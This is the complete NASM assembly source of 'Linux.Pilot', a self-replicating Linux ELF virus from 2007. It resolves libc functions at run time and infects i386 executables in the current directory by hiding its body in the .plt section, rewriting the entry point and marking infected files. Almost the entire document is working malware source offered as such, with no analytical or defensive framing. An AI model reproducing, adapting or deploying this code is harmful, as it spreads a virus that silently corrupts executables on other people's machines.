   ; Linux.Pilot, alpha, (x) herm1t, 2007
   ; This virus implements two features:
   ; * Resolving and using libc functions
   ; * It is cavity infector, removing PLT and restoring it
   ; both at run-time
   ; http://vx.org.ua/herm1t/
           BITS    32
           CPU 386
           section .text
           global  main
   ;%define    DEBUG
   %include 'pilot.inc'
           extern _GLOBAL_OFFSET_TABLE_
           extern  exit
   ;;;;
   old_main:   push    0
           call    exit
   ; fake PLT
           align   16
   _plt:       push    dword [_GLOBAL_OFFSET_TABLE_ + 4]
           jmp dword [_GLOBAL_OFFSET_TABLE_ + 8]
           dd  0
   main:       pusha
           call    .l0
   .l0:        pop ebp
           sub ebp, (.l0 - main)
           ; find libc
           mov ebx, [ebp - 8]              ; GOT + 8
           mov eax, [ebx]              ; GOT[2] - _dl_runtime_resolve
           or  eax, eax
           jnz .lazy
           ; address is empty, LD_BIND_NOW is set?
           ; use GOT[4], hope that this is libc...
           ; this could be checked
           mov eax, [ebx + 8]
           jmp .bnow
   .lazy:      call    unwind
           mov eax, [ecx + 16]             ; GOT[4] - address of libc' function
   .bnow:      call    unwind                  ; within interp
   %macro getdt    2
       push %2
       push esi
       call get_from_dyn
       xchg eax, %1
   %endmacro
           ; now we have
           ; esi       - libc' DYNAMIC
           ; edi       - libc' delta
           ; ecx       - libc' GOT
           getdt   ebx, DT_STRTAB
           getdt   edx, DT_SYMTAB
           getdt   esi, DT_HASH
   ; no error checking here, if we failed we got fucked anyway (with broken PLT)...
   ;       mov eax, ebx
   ;       and eax, edx
   ;       and eax, esi
   ;       jz  near fail

           ; all is ready for the symbol lookup
           ; we have the following registers layout:
           ; eax, ecx  - spare
           ; ebx       - libc .dynstr
           ; edx       - libc .dynsym
           ; esi       - libc .hash
           ; edi       - delta between libc' file and memory location
           ; ebp       - start of virus
           xor ecx, ecx
       resolve:movzx   eax, byte [ebp + O(indexes) + ecx]
           lea eax, [ebp + O(strings) + eax]
           push    ebx     ; .dynstr
           push    edx     ; .dynsym
           push    esi     ; .hash
           push    eax     ; function name
           call    lookup
           add eax, edi    ; delta
           push    eax
           inc ecx
           cmp ecx, N_SYMS
           jb  resolve
           ; now we have addresses of functions in stack

           ; allocate virus text and data
           push    0               ; offset
           push    0               ; fd
           push    MAP_PRIVATE|MAP_ANONYMOUS   ; flags
           push    PROT_READ|PROT_WRITE        ; prot
           push    8192                ; length
           push    0               ; size
           call    [esp + 24 + 8]          ; mmap()
           add esp, 24

           xchg    eax, ebx
           ; copy virus body
           mov esi, ebp
           mov edi, ebx
           mov ecx, O(virus_end)
           rep movsb
           ; mprotect(virus, virus_length, PROT_READ|PROT_EXEC)
           push    PROT_READ|PROT_EXEC
           push    O(virus_end)
           push    ebx
           call    [esp + 12 + 20]
           add esp, 12
           ; copy addresses
           mov esi, esp
           lea edi, [ebx + 4096]
           push    N_SYMS*4
           pop ecx
           rep movsb
           mov esp, esi
           ; move control
           lea eax, [ebx + O(.fixplt)]
           jmp eax
       .fixplt:
           ; restore .plt
           mov eax, ebp
           and ax, 0xf000
           push    PROT_READ|PROT_WRITE
           push    8192
           push    eax
           call    mprotect
           mov edx, dword 0x08049000
   first_got   equ $-4-main
           mov esi, dword 0x00000000
   first_rel   equ $-4-main
           mov eax, dword 0xffffffe0
           mov edi, ebp
           mov ecx, dword 1
   plt_count   equ $-4-main
       .fix:   push    eax
           mov ax, 0x25ff
           stosw
           mov eax, edx
           stosd
           mov al, 0x68
           stosb
           mov eax, esi
           stosd
           mov al, 0xe9
           stosb
           pop eax
           stosd
           sub eax, 16
           add esi, 8
           add edx, 4
           loop    .fix
           mov byte [esp + 8], PROT_READ|PROT_EXEC
           call    mprotect
           add esp, 12

   %ifdef  DEBUG
           push    dword O(virus_end)
           lea eax, [ebx + O(hello)]
           push    eax
           call    printf
           add esp, 8
   %endif
           ; ok here we go
           push    0x2e
           push    esp
           call    opendir
           add esp, 8
           or  eax, eax
           jz  fail
           xchg    eax, ecx
       .find:  push    ecx
           call    readdir
           pop ecx
           or  eax, eax
           jz  .done

           lea eax, [eax + 11] ; d_name
           push    eax
           call    infect
           jmp .find

       .done:  push    ecx
           call    closedir
           pop ecx

       fail:   popa
           push    old_main
   old_entry   equ $-4-main
           ret

   infect:     pusha
           mov eax, [esp + 36]

           push    2
           push    eax
           call    open
           add esp, 8
           or  eax, eax
           js  .fail
           mov [ebx + file_handle], eax

           push    2
           push    0
           push    eax
           call    lseek
           add esp, 12
           mov [ebx + file_length], eax
           cmp eax,84
           jb  .close

           push    0               ; offset
           push    dword [ebx + file_handle]   ; handle
           push    MAP_SHARED          ; flags
           push    PROT_READ|PROT_WRITE        ; prot
           push    eax             ; length
           push    0               ; start
           call    mmap
           add esp, 24
           inc eax
           jz  .close
           dec eax
           xchg    eax, esi

           cmp dword [esi], 0x464c457f
           jne .unmap
           cmp byte [esi + 15], 0      ; already infected?
           jne .unmap
           cmp dword [esi + 16], 0x00030002    ; e_type == ET_EXEC &&
           jne .unmap              ; e_machine == EM_386

           ; shdr and shnum
           mov edi, [esi + e_shoff]
           add edi, esi
           movzx   ecx, word [esi + e_shnum]
           ; .strtab
           movzx   edx, word [esi + e_shstrndx]    ; ehdr->e_shstrndx
           shl edx, 3
           lea edx, [edx * 4 + edx]        ; * 40
           add edx, edi            ; + shdr
           mov edx, [edx + sh_offset]      ; sh_offset
           add edx, esi            ; strtab = m + shdr[ehdr->e_shstrndx].sh_offset
           ; find PLT section
       .fplt:  mov eax, [edi + sh_name]
           add eax, edx
           cmp dword [eax], '.plt'
           je  .found
           add edi, 40
           loop    .fplt
           jmp .unmap
       .found:
           mov eax, [edi + sh_addr]
           add eax, 16
           mov [ebx + new_entry], eax
           ; check section size
           mov ecx, [edi + sh_size]
           sub ecx, 16
           shr ecx, 4
           mov eax, (O(virus_end) + 15) / 16
           cmp ecx, eax
           jb  .unmap
           mov ecx, eax
           mov edi, [edi + sh_offset]
           add edi, esi
           add edi, 16
           mov [ebx + plt_ptr], edi

           ; check that offsets/addreses in PLT entries are contiguos
           ; this could be enforced or contrarily removed if you sure
           ; that entries are always sorted
           xor edx, edx
           xor ebp, ebp
       .check: or  edx, edx
           je  .first
               mov eax, [edi + 2]
               add eax, [edi + 7]
               sub eax, edx
               sub eax, ebp
               cmp eax, 12
               jne .unmap
       .first: or  edx, edx
           mov edx, [edi + 2]
           mov ebp, [edi + 7]
           jnz .loop
               mov [ebx + gotp], edx
               mov [ebx + orel], ebp
               mov [ebx + pcnt], ecx
       .loop:  add edi, 16
           loop    .check

           ; write virus body
           pusha
           mov esi, ebx
           mov edi, [ebx + plt_ptr]
           mov ecx, O(virus_end)
           rep movsb
           popa

           ; save PLT's first ptr to GOT, offset in .rel.plt, count, old entry point
           mov edi, [ebx + plt_ptr]
           mov eax, [ebx + gotp]
           mov [edi + first_got], eax
           mov eax, [ebx + orel]
           mov [edi + first_rel], eax
           mov eax, [ebx + pcnt]
           mov [edi + plt_count], eax
           mov eax, [esi + e_entry]
           mov [edi + old_entry], eax
           ; change entry point, set infection mark
           mov eax, [ebx + new_entry]
           mov [esi + e_entry], eax
           inc byte [esi + 15]

       .unmap: push    dword [ebx + file_length]
           push    esi
           call    munmap
           pop eax
           pop eax

       .close: push    dword [ebx + file_handle]
           call    close
           pop eax

       .fail:  popa
           retn    4

   unwind:     push    eax
           call    get_base
           xchg    eax, edi
           push    edi
           call    get_dyn_file_base
   ;       or  eax, eax
   ;       jz  fail
           xchg    eax, esi

           sub edi, edx        ; memory base - file base
           add esi, edi

           push    DT_PLTGOT
           push    esi
           call    get_from_dyn
   ;       or  eax, eax
   ;       jz  fail
           xchg    eax, ecx
           ret

   ; get_base(addr) - return base address of the loaded ELF file
   get_base:   mov eax, [esp + 4]
           and ax, 0xf000
       .loop:  cmp dword [eax + 0], 0x464c457f
           jne .next
   ;       cmp dword [eax + 4], 0x00010101
   ;       jne .next
           retn    4
       .next:  sub eax, 4096
           jmp .loop
   ; get_from_dyn(DYNAMIC, tag) - return the DYNAMIC entry with given tag
   get_from_dyn:   push    esi
           cld
           mov esi, [esp + 8]
       .loop:  lodsd
           or  eax, eax
           jz  .done
           cmp eax, [esp + 12]
           je  .done
           lodsd
           jmp .loop
       .done:  lodsd
           pop esi
           retn    8
   ; uint64_t get_dyn_file_base(elf_file) return VA of DYNAMIC and lowest VA in ELF file
   get_dyn_file_base:
           pusha
           mov esi, [esp + 36]
           movzx   ecx, word [esi + e_phnum]
           add esi, [esi + e_phoff]
           xor eax, eax
           cdq
           dec edx
       .loop:  mov ebx, [esi + p_type]
           cmp ebx, PT_LOAD
           jne .more
           cmp [esi + p_vaddr], edx
           jae .more
           mov edx, [esi + p_vaddr]
       .more:  cmp ebx, PT_DYNAMIC
           jne .next
           mov eax, [esi + p_vaddr]
       .next:  add esi, 32
           loop    .loop
           inc edx
           jz  .fail
           dec edx
       .fail:  mov [esp + 28], eax
           mov [esp + 20], edx
           popa
           retn    4
   ; elf_hash(name)
   elf_hash:   pusha
           cld
           xor eax, eax
           xor edx, edx    ; edx - h
           mov esi, [esp + 36] ; name
       .next:  lodsb
           or  eax, eax
           jz  .done
           shl edx, 4
           add edx, eax

           mov ebx, edx
           and ebx, 0xf0000000
           jz  .skip
           mov ecx, ebx
           shr ecx, 24
           xor edx, ecx
       .skip:  not ebx
           and edx, ebx
           jmp .next
       .done:  mov [esp + 28], edx
           popa
           retn    4
   ; lookup(name,hash,dynsym,dynstr) - return st_value of the symbol by name
   lookup:     pusha
           mov eax, [esp + 36]     ; name
           mov ebx, [esp + 40]     ; hash
           mov ecx, [ebx]      ; nbuckets
           xor edx, edx
           lea esi, [ebx + 8]      ; buckets
           lea edi, [esi + ecx * 4]    ; chains
           push    eax
           call    elf_hash
           div ecx
           mov eax, edx
           mov eax, [esi + eax * 4]
       .for:   or  eax, eax
           jz  .return
       .more:  push    dword [esp + 36]    ; name
           mov ebx, eax
           shl ebx, 4
           add ebx, [esp + 44 + 4] ; sym[idx]
           mov ebp, eax
           mov edx, ebx
           mov ebx, [ebx]
           add ebx, [esp + 48 + 4]
           push    ebx
           call    strcmp
           or  eax, eax
           jnz .next
               mov eax, [edx + 4]  ; st_value
       .return:    mov [esp + 28], eax
               popa
               retn    16
       .next:  mov eax, [edi + ebp * 4]
           jmp .for
   ; guess what
   strcmp:     pusha
           mov ecx, [esp + 36]
           mov edx, [esp + 40]
           xor eax, eax
       .loop:  mov al, byte [ecx]
           cmp al, byte [edx]
           jne .diff
           inc edx
           inc ecx
           test    al, al
           jnz .loop
           jmp .ret
       .diff   movzx   ecx, byte [edx]
           sub eax, ecx
       .ret:   mov [esp + 28], eax
           popa
           retn    8
   ; our PLT-like helpers
   open:       jmp [ebx + 4096 + 0]
   lseek:      jmp [ebx + 4096 + 4]
   mmap:       jmp [ebx + 4096 + 8]
   close:      jmp [ebx + 4096 + 12]
   munmap:     jmp [ebx + 4096 + 16]
   mprotect:   jmp [ebx + 4096 + 20]
   readdir:    jmp [ebx + 4096 + 24]
   opendir:    jmp [ebx + 4096 + 28]
   closedir:   jmp [ebx + 4096 + 32]
   %ifdef  DEBUG
   printf:     jmp [ebx + 4096 + 36]
   %endif
   ; our strtab
   %macro stridx 1-*
       %rep    %0
           db  %1-strings
           %rotate 1
       %endrep
   %endmacro
       indexes:
   %ifdef  DEBUG
           stridx  sa
   %endif
           stridx  s9,s8,s7,s6,s5,s4,s3,s2,s1
   N_SYMS      equ $ - indexes
       strings:
   s1      db  "open", 0
   s2      db  "lseek", 0
   s3      db  "mmap", 0
   s4      db  "close", 0
   s5      db  "munmap", 0
   s6      db  "mprotect", 0
   s7      db  "readdir", 0
   s8      db  "opendir", 0
   s9      db  "closedir", 0
   %ifdef  DEBUG
   sa      db  "printf", 0
   %endif
   %if ($ - strings) > 256
   %error "String table is too large"
   %endif
   %ifdef  DEBUG
   hello       db  "Linux.PiLoT size = %d", 10, 0
   %else
           db  "PiLoT",0
   %endif
   virus_end:
           resb    4096
   data_start  equ 4096 + N_SYMS*4
   file_handle equ data_start + 0
   file_length equ data_start + 4
   new_entry   equ data_start + 8
   plt_ptr     equ data_start + 12
   gotp        equ data_start + 16
   orel        equ data_start + 20
   pcnt        equ data_start + 20
   ;
